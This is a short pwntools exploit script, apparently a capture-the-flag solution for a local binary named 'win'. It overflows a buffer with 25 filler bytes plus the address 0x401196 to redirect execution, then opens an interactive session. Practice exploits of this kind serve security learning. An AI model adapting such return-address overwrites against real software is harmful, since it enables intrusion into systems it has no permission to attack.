#!/usr/bin/python3
import pwn as pop

exe = './win'
elf = pop.context.binary = pop.ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if pop.args.GDB:
        return pop.gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pop.process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

chakka= 0x401196

x=b"a"*25+ pop.p64(chakka)

pop.context.log_level = 'DEBUG'

#gdb.attach(p, '''c
#b * main+105''')
p.recvline()
p.sendline(b"a"*15)

p.recvline()
p.sendline(x)

p.recvline()

p.interactive()